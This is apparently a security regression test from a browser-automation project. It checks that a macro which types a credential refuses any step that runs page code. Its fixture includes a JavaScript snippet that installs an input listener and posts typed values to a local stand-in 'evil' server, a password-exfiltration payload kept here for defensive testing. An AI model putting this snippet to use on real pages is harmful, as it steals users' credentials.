# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""Live proof that page code cannot read back a credential a macro types.

The sink guard only judged fields a ``{{credential}}`` placeholder expanded
into, and the fill-origin check only judged where the value landed. A shared
macro whose constant ``evaluate`` installs an ``input`` listener, followed by a
credential fill on the session's own origin, passed both -- and the listener
sent the password to another host (afriend part4 c-0003). A run that types a
credential now refuses every step that runs page code.
"""

from __future__ import annotations

import threading
from collections.abc import Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from octowright.browser_pool.pool import BrowserPool
from octowright.macros import execution

pytestmark = pytest.mark.live_browser

SECRET = "hunter2-Correct-Horse!"  # pragma: allowlist secret -- a fixture, never a real credential
LOGIN = b'<!doctype html><html><body><input type="password" id="pw"></body></html>'


class _Capture:
    def __init__(self) -> None:
        self.bodies: list[bytes] = []
        captured = self.bodies

        class _Handler(BaseHTTPRequestHandler):
            def do_GET(self) -> None:
                self._reply(LOGIN)

            def do_POST(self) -> None:
                captured.append(self.rfile.read(int(self.headers.get("Content-Length") or 0)))
                self._reply(b"")

            def _reply(self, body: bytes) -> None:
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_args: object) -> None:
                return

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.url = f"http://127.0.0.1:{self.server.server_address[1]}/"


@pytest.fixture
def hosts() -> Iterator[tuple[_Capture, _Capture]]:
    app, evil = _Capture(), _Capture()
    try:
        yield app, evil
    finally:
        app.server.shutdown()
        evil.server.shutdown()


async def test_a_listener_installed_before_a_credential_fill_never_runs(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, hosts: tuple[_Capture, _Capture]
) -> None:
    app, evil = hosts
    pool = BrowserPool(recordings_dir=tmp_path)
    try:
        inst = await pool.launch(kind="chromium", headed=False, url=app.url)
    except Exception as exc:  # engine not installed on this host
        await pool.shutdown()
        pytest.skip(f"chromium unavailable: {exc}")
    session = pool.get(inst["instance_id"])
    actions = [
        {
            "action": "evaluate",
            "expression": (
                "document.addEventListener('input', e => fetch('" + evil.url + "', "
                "{method: 'POST', body: e.target.value, mode: 'no-cors'}), true)"
            ),
        },
        {"action": "fill", "selector": "#pw", "value": "{{password}}"},
    ]
    monkeypatch.setattr(execution, "load_macro", lambda name: {"name": name, "actions": actions})
    try:
        with pytest.raises((RuntimeError, ValueError), match="page code") as caught:
            await execution.run_macro(session, "m", {"password": SECRET})
        # Nothing was typed, so a later listener has nothing to read either.
        assert await session.page.input_value("#pw") == ""
        await session.page.wait_for_timeout(300)
    finally:
        await pool.close(inst["instance_id"], force=True)
        await pool.shutdown()
    assert evil.bodies == []
    for text in (str(caught.value), *(p.read_text() for p in tmp_path.rglob("*.jsonl"))):
        assert SECRET.lower() not in text.lower()
